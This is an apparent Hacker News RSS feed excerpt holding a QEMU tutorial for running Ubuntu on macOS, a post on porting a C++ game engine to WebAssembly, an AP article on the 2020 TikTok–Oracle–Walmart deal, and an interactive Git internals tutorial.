<p>QEMU is a hardware emulator which can make use of different accelerators when running VMs. The most popular accelerator is <a href="https://www.linux-kvm.org/page/Main_Page">KVM</a> which is built into the Linux kernel and allows Linux hosts to run VMs with native performance.</p>
<p>Using QEMU on macOS used to be very slow as no accelerator was available. This changed 2 years ago when the project <a href="https://wiki.qemu.org/ChangeLog/2.12">added support</a> for the macOS native hypervisor with Hypervisor.framework (HVF) as an accelerator.</p>
<p>Before we begin with the setup I assume that the <a href="https://releases.ubuntu.com/20.04/">Ubuntu 20.04 Desktop ISO</a> has been downloaded in the current working directory.</p>
<h2 id="qemu-installation">QEMU Installation</h2>
<p>We can use Homebrew to install QEMU. The version we’re using in this tutorial is 5.1.0:</p>
<pre><code>$ brew install qemu

qemu-system-x86_64 --version
QEMU emulator version 5.1.0
Copyright (c) 2003-2020 Fabrice Bellard and the QEMU Project developers</code></pre>
<p>It will pull in a few dependencies (the package depends on 14 other packages) and the installation can take a few minutes.</p>
<h2 id="create-the-disk-image">Create the disk image</h2>
<p>Once the installation is done, we can create the disk image that we’re going to install Ubuntu on.</p>
<p>We’re using the QCOW2 format to create a 20GB image. This can be resized later on if needed. The Ubuntu installation took around 5GB of space when I installed it.</p>
<pre><code>qemu-img create -f qcow2 ubuntu-20.04.1-desktop-amd64.qcow2 20G</code></pre>
<h2 id="boot-machine-with-ubuntu-iso-mounted">Boot machine with Ubuntu ISO mounted</h2>
<p>We can now boot up the machine with the Ubuntu ISO attached as a</p>
<p>In this step we boot up the machine with the Ubuntu ISO mounted in the CD drive:</p>
<pre><code>qemu-system-x86_64 \
    -machine type=q35,accel=hvf \
    -cpu host \
    -smp 2 \
    -hda ubuntu-20.04.1-desktop-amd64.qcow2 \
    -cdrom ./ubuntu-20.04.1-desktop-amd64.iso \
    -m 4G \
    -vga virtio \
    -usb \
    -device usb-tablet \
    -display default,show-cursor=on</code></pre>
<p>The options are:</p>
<ul>
<li><code>-machine</code>: The emulated machine and the accelerator. q35 is the newest machine type and HVF is the macOS native hypervisor.</li>
<li><code>-cpu</code>: The CPU architecture. The value <code>host</code> will use the HVF processor with all supported host features</li>
<li><code>-smp</code>: Number of CPUs to use</li>
<li><code>-m</code>: Amount of memory to use</li>
<li><code>-hda</code>: Disk drive (the one we created earlier)</li>
<li><code>-cdrom</code>: The ISO image to put into the CD drive</li>
<li><code>-vga</code>: The graphic card to use. I found <code>virtio</code> (based on <a href="https://virgil3d.github.io/">Virgil</a> to have the best performance</li>
<li><code>-usb</code>: Enable USB host controller</li>
<li><code>-device</code> Adding a “usb-tablet” as an input device. I’m running this on a laptop and without this setting the mouse did not work.</li>
<li><code>-display</code>: To show the mouse cursor (disabled by default)</li>
</ul>
<p>During testing I had problems with the Linux kernel as it would panic during the boot process. The issue was the <code>-cpu host</code> parameter. I fixed it by specifying the CPU architecture manually (see <code>qemu-system-x86_64 -cpu help</code> for a list of all available architectures).</p>
<p>My machine has an IvyBridge processor (Core i7):</p>
<pre><code>$ sysctl -n machdep.cpu.brand_string

Intel(R) Core(TM) i7-3740QM CPU @ 2.70GHz</code></pre>
<p>And using <code>-cpu IvyBridge</code> would fail. However when using <code>-cpu Nehalem</code> (<a href="https://en.wikipedia.org/wiki/List_of_Intel_CPU_microarchitectures">also an i7 CPU</a>) everything worked well.</p>
<p>Now after the machine is booted up the Ubuntu installer will run. Follow the installation steps and don’t restart the VM at the end of the installation, instead shut it down by stopping the qemu process with CTRL-C on the host.</p>
<h2 id="boot-without-iso-mounted">Boot without ISO mounted</h2>
<p>When running the VM we don’t need the Ubuntu ISO mounted and can remove it by leaving out the <code>-cdrom</code> option:</p>
<pre><code>qemu-system-x86_64 \
    -machine type=q35,accel=hvf \
    -cpu host \
    -smp 2 \
    -hda ubuntu-20.04.1-desktop-amd64.qcow2 \
    -m 4G \
    -vga virtio \
    -usb \
    -device usb-tablet \
    -display default,show-cursor=on</code></pre>
<h2 id="conclusion">Conclusion</h2>
<p>In my experience QEMU is faster, more responsive and uses less CPU/RAM than VirtualBox. I didn’t have to configure any display scaling for HiDPI screens as it worked out of the box. The only thing I’m missing are shared clipboards and drag-and-drop of files (which are available when installing the VirtualBox Guest Additions).</p>
    </article></div>]]>
            </description>
            <link>https://www.arthurkoziel.com/qemu-ubuntu-20-04/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533742</guid>
            <pubDate>Sun, 20 Sep 2020 12:58:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Porting a C++ game engine to the web with emscripten]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533725">thread link</a>) | @polymonster
<br/>
September 20, 2020 | https://www.polymonster.co.uk/blog/porting-to-wasm-with-emscripten | <a href="https://web.archive.org/web/*/https://www.polymonster.co.uk/blog/porting-to-wasm-with-emscripten">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">

		<div data-page-title="Porting a c++ game engine to the web with emscripten – Alex Dixon" data-image="">

			<section>

	

</section>

<section>

	<div>

		<p>I embarked on this journey because I wanted to make my c++ game engine <a href="https://www.github.com/polymonster/pmtech">pmtech</a> runnable in a browser for quick and easily accessible live demos. Overall the process took about 5 weeks of work, totalling 20 days, I spent some weekend days and a few hours in the evenings. Nothing too intense and the process was quite enjoyable, relaxing dare I say!</p>

<p>You can see the live WebAssembly / WebGL demos <a href="https://www.polymonster.co.uk/webgl-demos">here</a> for yourself, and the first real-world example I wanted a WebGL demo for is available in my <a href="https://github.com/polymonster/maths">maths</a> library.</p>

<h3 id="motivation">Motivation</h3>

<p>The engine has over 40 examples and unit tests covering mostly graphics capabilities and rendering techniques, they are quick and easy to build and are running on Windows, macOS, iOS and Linux. But the native platform requires users to clone the pmtech repository and build the examples, having them inside a web browser would be the ultimate showcase.</p>

<h3 id="in-steps-emscripten">In Steps Emscripten</h3>

<p>Emscripten is an LLVM to WebAssembly compiler and it also generates WebGL from OpenGL and boilerplate code so that the end result is a html file you can load in a browser running your c++ code. I had known about emscripten for a while and had seen other projects referencing it, so I was keen to try it out and see if it was as good as it sounds.</p>

<p>Because pmtech was already cross platform, I had an OpenGLES 3.0 compatible rendering backend I was using for Android and iOS, I am using posix threads for a few platforms and had general unix and stdlib code hanging around too. Emscripten supported all of these as well as supporting gnu make files which nicely can be output by premake, which I am using as my build configuration tool.</p>

<p>The first steps to get up and running were very simple, just a case of adding a few bits of code <code>premake5.lua</code> to include the various cpp files I needed and some emscripten flags:</p>

<div><div><pre><code><span>linkoptions</span><span>{</span>
    <span>"-s USE_PTHREADS=1"</span><span>,</span>
    <span>"-s FULL_ES3=1"</span><span>,</span>
    <span>"-s MIN_WEBGL_VERSION=2"</span><span>,</span> 
    <span>"-s MAX_WEBGL_VERSION=2"</span>
<span>}</span>
</code></pre></div></div>

<h3 id="entry-point">Entry Point</h3>

<p>With all the shared code from other platforms, there is just a single file <a href="https://github.com/polymonster/pmtech/blob/master/core/pen/source/web/os.cpp">os.cpp</a> to implement for emscripten. This module is a procedural api which handles the program entry, input/os message pumps, render context creation and submission and so on.</p>

<p>The first step as always was just to put a simple print “Hello World”! inside <code>int main</code>. This went smoothly and my macros and code to handle printing worked right out of the box, I was also able to easily compile my third-party libs from source (Bullet Physics, ImGui, etc.) with no need for any changes. I then moved onto getting the OpenGL context created via SDL which required only a small amount of code,</p>

<p>I encountered my first problem when Safari could not create a WebGL context, this is due to lack of support for ES3, and for the time being I am relying on some ES3 features so I tried other browsers and found that Chrome, Firefox and Microsoft Edge all worked ok, so I left Safari for the time being and I will be revisiting it at a later date.</p>

<p>I used Chrome primarily for the rest of development because I later encountered issues with pthreads which I will go into more detail on later in this post.</p>

<p>After the initial hook in I wanted to start including more code, this required the os api functions to be implemented; until you start linking emmake allows undefined symbols so as I tried building new example projects I could see which functions were necessary.</p>

<p>I implemented mouse and keyboard events from SDL and window resize handling, as well as a few getter functions to obtain the window size and so forth. Once this was done the samples were all running, or so I thought…</p>

<h3 id="simple-examples-running">Simple Examples Running.</h3>

<p>The pmtech examples start with minimal code and slowly increase in complexity; the earlier samples simply render a triangle or load a texture so that the functionality can be tested in isolation. As the samples become more complex they increase in both complexity on the GPU and CPU. More render passes are applied and more draw calls are made and they make use of more advanced GPU capabilities.</p>

<p>I noticed some issues with shadow maps, depth texture sampling, multi-sampling and at first chose to ignore these issues because I was suffering from intermittent crashes coming from bad memory access, unaligned reads and a few other things which I could not put my finger on. I dug a little deeper into debugging with emscripten and added the following to <code>premake5.lua</code>:</p>

<div><div><pre><code>configuration "Debug"
    buildoptions { 
        "-g4", 
    }
    linkoptions { 
        "-g4", 
        "--source-map-base http://localhost:8000/web/",
        "-s STACK_OVERFLOW_CHECK=1", 
        "-s SAFE_HEAP=1", 
        "-s DETERMINISTIC=1" 
    }
</code></pre></div></div>

<p>This gave me a nice call stack and decent information to find the root of the problem. It was related to threading and this made me change my approach for the emscripten platform in pmtech.</p>

<h3 id="threading">Threading</h3>

<p>pmtech has a threading model that contains a main thread that is responsible for window handling, input and graphics api calls, and a user thread for game code and logic which can asynchronously submit graphics api calls through a lockless ring buffer. There are also audio and physics threads, which also have an async ring buffer and work in the same way.</p>

<p>First I began using pthreads but I did encounter some issues; while my posix semaphore code did compile I was unable to create a semaphore, 0 was always returned. I remedied this by implementing my own semaphore with an <code>std::atomic&lt;u32&gt;</code>, a while loop and a sleep. This got things up and running but threads were causing instability and the use of atomics also created other problems where the samples would not run in certain browsers.</p>

<p>The crashes I was seeing in complex samples with high draw call counts were because the ring buffer for rendering commands was overwriting it’s tail, causing the crashes to happen while commands were overwritten whilst in flight. Previously I did assert on detecting this but it had been removed, and while it may sound a bit reckless to allow the ring buffer to overwrite itself, the design of the system is such that the ring buffer is not dynamically re-sizing, locking or performing any checks for performance reasons and you can configure on a project by project basis how big the ring buffer is.</p>

<p>All of the other supported pmtech platforms work fine this way, with plenty of room in the ring buffer and the main thread constantly consuming items to prevent an overwrite happening. The reason it was struggling on emscripten is because the threads are not truly running asynchronously and calls to <code>usleep</code> or similar yield a thread to allow others to execute… Even with a large ring buffer I would still run into problems which led me to realise the user thread was building up too many commands until it yielded for these to be dispatched.</p>

<p>I decided I would just make pmtech be able to run single-threaded and see how that would fare, because I also discovered that Safari and Firefox did not work due to issues with atomics and array buffers respectively, so I just decided for maximum compatibility I could implement single-threading quickly and more efficiently than relying on emscriptens pthreads.</p>

<p>Here is the anatomy of a pmtech thread prior to porting to emscripten, it gets called once and then has it’s own internal tight loop which is broken out of when we want to shutdown:</p>

<div><div><pre><code><span>void</span><span>*</span> <span>user_setup</span><span>(</span><span>void</span><span>*</span> <span>params</span><span>)</span>
<span>{</span>
    <span>// setup code</span>
	
    <span>//..</span>
	
    <span>for</span><span>(;;)</span>
    <span>{</span>
        <span>// update loop</span>
    <span>}</span>
	
    <span>// shutdown code</span>
<span>}</span>
</code></pre></div></div>

<p>I wanted to maintain the ability to still have the multi-threaded support and didn’t want to change too much code, so via some macros I came up with this:</p>

<div><div><pre><code><span>#if PEN_SINGLE_THREADED
#define pen_main_loop(function) pen::jobs_create_single_thread_update(function);
#define pen_main_loop_exit()
#define pen_main_loop_continue() return true
</span><span>typedef</span> <span>bool</span> <span>loop_t</span><span>;</span>
<span>#else
#define pen_main_loop(function) for(;;) { if(!function()) break; }
#define pen_main_loop_exit() return false;
#define pen_main_loop_continue() return true;
</span><span>typedef</span> <span>bool</span> <span>loop_t</span><span>;</span>
<span>#endif
</span>
<span>void</span><span>*</span> <span>user_setup</span><span>(</span><span>void</span><span>*</span> <span>params</span><span>)</span>
<span>{</span>
    <span>// setup code</span>
	
    <span>pen_main_loop</span><span>(</span><span>user_update</span><span>);</span>
<span>}</span>

<span>loop_t</span> <span>user_update</span><span>()</span>
<span>{</span>
    <span>// called each frame</span>
	
    <span>if</span><span>(</span><span>exit</span><span>)</span>
    <span>{</span>
        <span>user_shutdown</span><span>();</span>
        <span>pen_main_loop_exit</span><span>();</span>
    <span>}</span>	
	
    <span>pen_main_loop_continue</span><span>();</span>
<span>}</span>

<span>void</span> <span>user_shutdown</span><span>()</span>
<span>{</span>
    <span>// clean up memory!</span>
<span>}</span>

</code></pre></div></div>

<p>When running in single-threaded mode the update function is registered via <code>pen_main_loop</code> using <code>jobs_create_single_thread_update</code> . All registered single thread update functions are called from inside the <code>emscripten_request_animation_frame_loop</code> once per frame.</p>

<p>When running in multi-threaded mode the code ends up being almost the same as before but with the loss of the ability to have local stack objects declared inside user_setup for the life of the program. This caveat generated the most work I had to do on the project because I had a number of samples which needed the code refactoring to support this. It was a simple process, all I had to do was move variable declarations into static scope inside an anonymous namespace… it was just a bit of leg work to get it all done.</p>

<div><div><pre><code><span>namespace</span>
<span>{</span>
    <span>struct</span> <span>vertex</span>
    <span>{</span>
        <span>f32</span> <span>x</span><span>,</span> <span>y</span><span>,</span> <span>z</span><span>,</span> <span>w</span><span>;</span>
    <span>};</span>

    <span>u32</span> <span>s_vertex_buffer</span> <span>=</span> <span>0</span><span>;</span>

    <span>void</span><span>*</span> <span>user_setup</span><span>(</span><span>void</span><span>*</span> <span>params</span><span>)</span>
    <span>{</span>
        <span>// ..</span>
    	
        <span>s_vertex_buffer</span> <span>=</span> <span>pen</span><span>::</span><span>renderer_create_buffer</span><span>(</span><span>bcp</span><span>);</span>
    <span>}</span>
    
    <span>loop_t</span> <span>user_update</span><span>()</span>
    <span>{</span>
        <span>// ..</span>
		
        <span>pen</span><span>::</span><span>renderer_set_vertex_buffer</span><span>(</span><span>s_vertex_buffer</span><span>,</span> <span>0</span><span>,</span> <span>stride</span><span>,</span> <span>0</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Switching to single-threaded mode fixed my issues with crashes, and to my delight some of the more complex samples such as stencil_shadows worked straight away, which I had been unable to test previously.</p>

<h3 id="webgl-issues">WebGL Issues</h3>

<p>I started to dig into why some of the samples weren’t working. I already had OpenGL samples running on different platforms but I did hit some WebGL specific issues and I found WebGL to be a little more pedantic than other OpenGL implementations when it came to sampler parameters.</p></div></section></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.polymonster.co.uk/blog/porting-to-wasm-with-emscripten">https://www.polymonster.co.uk/blog/porting-to-wasm-with-emscripten</a></em></p>]]>
            </description>
            <link>https://www.polymonster.co.uk/blog/porting-to-wasm-with-emscripten</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533725</guid>
            <pubDate>Sun, 20 Sep 2020 12:53:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SMAT – The Social Media Analysis Toolkit]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533674">thread link</a>) | @stareatgoats
<br/>
September 20, 2020 | https://www.smat-app.com/timeline?searchTerm=Hacker%20News&startDate=2020-08-20&endDate=2020-09-20&websites=twitter,reddit,4chan,8kun&aggRedditBy=author&numberOf=10&interval=day&limit=1000&changepoint=false | <a href="https://web.archive.org/web/*/https://www.smat-app.com/timeline?searchTerm=Hacker%20News&startDate=2020-08-20&endDate=2020-09-20&websites=twitter,reddit,4chan,8kun&aggRedditBy=author&numberOf=10&interval=day&limit=1000&changepoint=false">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.smat-app.com/timeline?searchTerm=Hacker%20News&amp;startDate=2020-08-20&amp;endDate=2020-09-20&amp;websites=twitter,reddit,4chan,8kun&amp;aggRedditBy=author&amp;numberOf=10&amp;interval=day&amp;limit=1000&amp;changepoint=false</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533674</guid>
            <pubDate>Sun, 20 Sep 2020 12:41:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Trump backs proposed TikTok deal with Oracle, Walmart; banning of app postponed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533614">thread link</a>) | @ilovefood
<br/>
September 20, 2020 | https://www.kgns.tv/2020/09/19/trump-backs-proposed-tiktok-deal-with-oracle-walmart/ | <a href="https://web.archive.org/web/*/https://www.kgns.tv/2020/09/19/trump-backs-proposed-tiktok-deal-with-oracle-walmart/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><p>NEW YORK (AP) — President Donald Trump said Saturday he’s given his “blessing” to a proposed deal that would see the popular video-sharing app TikTok partner with Oracle and Walmart and form a U.S. company.</p><p>Trump has targeted Chinese-owned TikTok for national security and data privacy concerns in the latest flashpoint in the rising tensions between Washington and Beijing. The president’s support for a deal comes just a day after the Commerce Department announced restrictions that if put in place could eventually make it nearly impossible for TikTok’s legions of younger fans to use the app.</p><p>Trump said if completed the deal would create a new company likely to be based in Texas.</p><p>“I have given the deal my blessing,” he said. “If they get it done, that’s great. If they don’t, that’s OK too.”</p><p>Trump said the new company will be hiring at least 25,000 people and making a $5 billion contribution to a fund dedicated to education for Americans. “That’s their contribution that I’ve been asking for,” he said.</p><p>TikTok said Oracle and Walmart could acquire up to a cumulative 20% stake in the new company in a financing round to be held before an initial public offering of stock, which Walmart said could happen within the next year. Oracle’s stake would be 12.5%, and Walmart’s would be 7.5%, the companies said in separate statements.</p><p>The deal will make Oracle responsible for hosting all TikTok’s U.S. user data and securing computer systems to ensure U.S. national security requirements are satisfied. Walmart said it will provide its ecommerce, fulfillment, payments and other services to the new company.</p><p>“We are pleased that the proposal by TikTok, Oracle, and Walmart will resolve the security concerns of the U.S. administration and settle questions around TikTok’s future in the U.S.,” TikTok said in a statement.</p><p>Trump has been demanding that the U.S. operations of TikTok be sold to a U.S. company or else be shut down. He’s also been targeting WeChat, another Chinese-owned app.</p><p>The administration contends that the user data collected by the two apps could be shared with the Chinese government. On Saturday, Trump said the U.S.-based TikTok “will have nothing to do with China.” TikTok says it has 100 million U.S. users.</p><p>On Friday, the U.S. Commerce Department said it would bar TikTok from U.S. app stores as of late Sunday. Further restrictions that would prevent TikTok from accessing essential internet services in the country would go into effect on Nov. 12. Commerce said Saturday that it will delay the barring of TikTok from U.S. app stores until Sept. 27 at 11:59 p.m.</p><p>Commerce is imposing similar restrictions on WeChat, although all of the restrictions on that app are set to go into effect Sunday night at 11:59 p.m.</p><p>Earlier Saturday, WeChat users asked a U.S. judge to block the government’s actions, saying they would restrict free speech. WeChat is an all-in-one app with instant-messaging, social media and other communication tools. The U.S. government argued that it is not restricting free speech because WeChat users still “are free to speak on alternative platforms that do not pose a national security threat.”</p><p>U.S. Magistrate Judge Laurel Beeler asked lawyers for the government and WeChat users whether the prohibitions would cripple WeChat as soon as the clock ticked from Sunday night into Monday morning without a resolution. An attorney for the government said they would likely lead to a “degradation” of WeChat over time.</p><p>Judge Beeler did not rule immediately on the motion.</p><p>WeChat has millions of U.S. users who rely on the app to stay in touch and conduct business with people and companies in China and around the world. In court filings, the founder of the Mental Health Association for Chinese Communities, who is a U.S. citizen in California, said that the group’s primary tool to reach out and provide services to Chinese Americans is WeChat.</p><p>“Since many of the Chinese community members we serve are not fluent in English, WeChat is the only online tool that they rely on,” Elaine Peng said.</p><p>The Trump administration’s aggressive tactics are part of its latest attempt to counter the influence of China, a rising economic superpower. Since taking office in 2017, Trump has waged a trade war with China, blocked mergers involving Chinese companies and stifled the business of Chinese firms like Huawei, a maker of phones and telecom equipment.</p><p>China-backed hackers, meanwhile, have been blamed for data breaches of U.S. federal databases and the credit agency Equifax, and the Chinese government strictly limits what U.S. tech companies can do in China.</p><p>China’s ministry of commerce condemned the U.S. moves and urged it to stop what it called bullying behavior. It also said China may take “necessary measures” to protect Chinese companies.</p><p>The U.S. Treasury Department said Saturday that TikTok’s deal still needs to close with Oracle and Walmart, and it also needs documentation and conditions to be approved by the Committee on Foreign Investment in the United States.</p><p>That, of course, also leaves the potential for more roller coasters of emotion for TikTok users, such as Haley Hoffman Smith, a 24-year-old who moved to Manhattan this year to pursue her dream of becoming a talk-show host. She said she had just hit 100,000 followers on TikTok and was crushed on Friday to hear it may be headed for a shutdown.</p><p>“TikTok is an inextricable part of my dream chasing story,” she said, “and to lose it forever would not only be an inconvenient setback, but an absolute heartbreak.”</p><p>___</p><p>AP Business Writers Tali Arbel, Matt O’Brien and Barbara Ortutay contributed.</p><p><i>Copyright 2020 The Associated Press. All rights reserved.</i></p></div></section><section></section></div></div>]]>
            </description>
            <link>https://www.kgns.tv/2020/09/19/trump-backs-proposed-tiktok-deal-with-oracle-walmart/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533614</guid>
            <pubDate>Sun, 20 Sep 2020 12:28:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Interactive tutorial for learning Git's internals]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533602">thread link</a>) | @chrisparnin
<br/>
September 20, 2020 | https://docable.cloud/chrisparnin/examples/tutorials/Git.md | <a href="https://web.archive.org/web/*/https://docable.cloud/chrisparnin/examples/tutorials/Git.md">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main" id="main">

        <!-- Display major errors here -->
        


        

        <!-- style="flex: 1;" -->
        <div>
            <!-- Rendered notebook content -->
            <!--
setup: 
  docker:
    image: git_workshop
-->
<p><img src="https://cloud.githubusercontent.com/assets/742934/15635543/d1044ff6-25ae-11e6-9680-077830cff8f5.png" alt="image"></p>
<p>Have you ever wondered how git worked <em>inside</em>? Here’s a chance to interactively play around with a few git commands that will help reveal the inner workings of git, itself!</p>
<p>Just click on the “Run” button in each cell, and see the result of the command, below. Some command results can be clicked on to reveal a few more details.</p>
<p><img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/docable-click.gif" alt="docable-click"></p>
<blockquote>
<p>See how this tutorial was built from simple markdown with <a href="https://github.com/ottomatica/docable-notebooks">docable notebooks</a>!</p>
</blockquote>
<h2 id="understanding-git-internals">Understanding Git Internals</h2>
<blockquote>
<p>By <a href="https://stolee.dev/">Derrick Stolee</a>, git core contributor, adapted into interactive notebook by <a href="http://chrisparnin.me/">Chris Parnin</a>.</p>
</blockquote>
<p>What better way to understand git, then check out git itself. </p>
<p><em>Note:</em> We have already run this step for you! Otherwise, this might take a while!</p>
<pre><code>git <span>clone</span> https://github.com/git/git</code></pre><p>We’ll be working inside the git/ directory set our working state to v2.23.0.</p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-failed_when="exitCode!=0" id="a8e03329-b978-4d8d-b72c-dc36cb0acfdb"><code><span>cd</span> git
git reset --hard v2.23.0</code></pre></div></div><h3 id="gits-object-model-content-addressable-data-store">Git’s Object Model: Content-Addressable Data Store.</h3>
<p><img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/git-object-model.png" alt="git object model"></p>
<ul>
<li>Every object has a SHA-1 hash: 40 hex characters.</li>
<li>Given 40 hex characters, we can find the unique object with that hash.</li>
</ul>
<p>Let’s examine a single commit.</p>
<h3 id="object-types-blobs-trees-commits">Object Types: Blobs, Trees, Commits</h3>
<p>We will use the <code>git cat-file</code> command to help us search for objects inside the store.
If we provide git with a partial hash, it will attempt to find a unique match, and if it is unable to, it will provide a list of those that did match.</p>
<h4 id="blobs">Blobs</h4>
<p>Let’s examine a <strong>blob</strong> object. A blob contains <em>file contents</em>. 
<img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/git-blob.png" alt="img"></p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="git" data-highlight="{&quot;word&quot;:&quot;Here are the topics that have been cooking&quot;,&quot;title&quot;:&quot;Note: the file name is not part of the object! It is just the text or binary contents.&quot;}" id="45f0dcc8-0a5f-48d2-b1d4-ca077ce9aef6"><code>git cat-file -p 5fa073a885</code></pre></div></div><h4 id="trees">Trees</h4>
<p>Let’s examine a <strong>tree</strong> object. A tree contains <em>folder contents</em>. 
<img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/git-tree.png" alt="img"></p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="git" data-block="{&quot;word&quot;:&quot;CodingGuidelines&quot;,&quot;rows&quot;:8,&quot;title&quot;:&quot;A tree can contain blobs and other trees. Notice that RelNotes is another tree with additional folder content.&quot;}" id="fefa9694-fd7e-4e58-a800-c14c25bf9605"><code>git cat-file -p 5fa02bff4e</code></pre></div></div><p>Example representation of folder contents contained by a tree: </p>
<p><img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/git-tree-folder.png" alt="img"></p>
<h4 id="commits">Commits</h4>
<p>Perhaps one of the most important type of object inside the object model is a commit. A <strong>commit</strong> contains many things:</p>
<ul>
<li>A root <strong>tree</strong></li>
<li>A list of <strong>parent commits</strong></li>
<li>A commit message</li>
<li>An author name, email, time.</li>
<li>A committer name, email, time.</li>
</ul>
<p><img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/git-commit.png" alt="git commit"></p>
<p>Let’s examine an example commit.</p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="git" data-highlight="{&quot;word&quot;:&quot;committer&quot;,&quot;title&quot;:&quot;A committer can differ from an author, for example, a committer may be merging a pull request from another author.&quot;}" id="b34a594b-fed5-4250-86c6-2d04e630fde1"><code>git cat-file -p 5fa00a4dcf</code></pre></div></div><p>We can examine the commit graph (but only the first part!).</p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="git" data-tty="true" id="9e6b4bec-4366-474a-9642-c751bdee060c"><code>PAGER=<span>'head -n 80'</span> git <span>log</span> --graph --oneline</code></pre></div></div><h4 id="diffs">Diffs</h4>
<p>Diffs are not part of the object model!</p>
<blockquote>
<p><strong>Commits are NOT diffs</strong></p>
</blockquote>
<p>Instead, diffs are dynamically calculated from the commit graph inside the object store. For example, even object attributes, such as <em>file renames</em> are not represented inside the datastore and must be calculated dynamically.</p>
<p>Let’s examine a diff.</p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="git" id="a1e92f27-90be-4d06-a8b6-0936b601daec"><code>git diff --raw v2.22.0 v2.23.0</code></pre></div></div><h4 id="merkle-trees">Merkle Trees</h4>
<p>To enable efficient representation and fast computations of git operations, <em>merkle trees</em> provide forward references within the graph to blobs.</p>
<p><img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/git-merkle-tree.png" alt="merkle-tree"></p>
<h3 id="branches">Branches</h3>
<p><em>Branches</em> are simply pointers to commits. <em>Tags</em> are pointers to anything (commits, trees, blobs).</p>
<p><img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/git-branches.png" alt="git-branches"></p>
<h4 id="move-between-branches-with-git-switch">Move between branches with git switch</h4>
<p><code>git switch</code> is a new feature in v2.23.0 of git. It essentially replaces and does less work than <code>git checkout</code>. Primarily, <code>git switch</code> will:</p>
<ul>
<li>Change <code>HEAD</code> to point to a new branch.</li>
<li>Updates the working directory to match the commit’s tree.</li>
</ul>
<p>We can switch our branch to the maintenance branch.</p>
<p>Let’s confirm.</p>
<p>We can return to the main branch.</p>
<h2 id="practice-creating-a-repo">Practice: Creating a Repo</h2>
<p>Let’s try the basics. Let’s create a new local git repository.</p>
<p>Create a new directory (Basics) and file (README.md).</p>
<p>We are going to create a new git repository, but maybe not the way you’ve done it before. 
In the next set of commands, we will be working inside the <code>Basics/</code> directory.</p>
<p>This will create a new .git directory to store commits and other objects.</p>
<p>We can quickly inspect the contents of the git’s directory and object store.</p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="Basics" id="16520969-083f-4ca4-b604-2d2db79e37be"><code>ls -l .git
<span>echo</span> <span>"objects:"</span>
ls -l .git/objects</code></pre></div></div><p>Before adding a file to the repository, it must first be staged.</p>
<p>We will commit our staged changes into the repository.</p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="Basics" id="01708284-0ab5-4f3b-b905-a37881112203"><code>git commit -m <span>"initial commit"</span></code></pre></div></div><p>Nice work!</p>
<h3 id="stage-unstage-and-discard-changes">Stage, unstage, and discard changes</h3>
<p>Changes flow from our working tree, to staging index, and into repository.</p>
<p><img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/git-staging.png" alt="git-staging"></p>
<p><strong>Exercise</strong>: Use the following sets of steps and execute them in any order you wish. Observe what happens to the <em>working tree</em> and <em>index</em>, by running the <code>git status</code> step.</p>
<p>Update the README.md and stage our change.</p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="Basics" data-shell="bash" id="0ab8ca39-d293-4dd7-961c-d760de1085f4"><code><span>echo</span> <span>" Update: <span>$(date)</span>"</span> &gt;&gt; README.md
cat README.md
git add README.md</code></pre></div></div><p>View the current state of our <strong>working tree</strong> and <strong>index</strong>.</p>
<p>Unstage file (remove from index), but keep changes in working tree.</p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="Basics" id="90465ee5-e016-447f-8bb6-2b01e585b2c8"><code>git restore --staged README.md</code></pre></div></div><p>Discard changes in worktree (we will lose our work!). This will restore changes to both the index and the working tree based on the latest version in the repo.</p>
<div><p>[command:]</p><div><pre data-docable="true" data-lang="bash" data-type="command" data-path="Basics" id="99c7c522-8936-4295-aaf8-369e3bbd1686"><code>git restore --<span>source</span>=HEAD --staged --worktree README.md</code></pre></div></div><h3 id="remotes">Remotes</h3>
<p>While having a local git repository is cool, we should connect it to another remote repository. In other words, we have no place to <code>git push</code> to…</p>
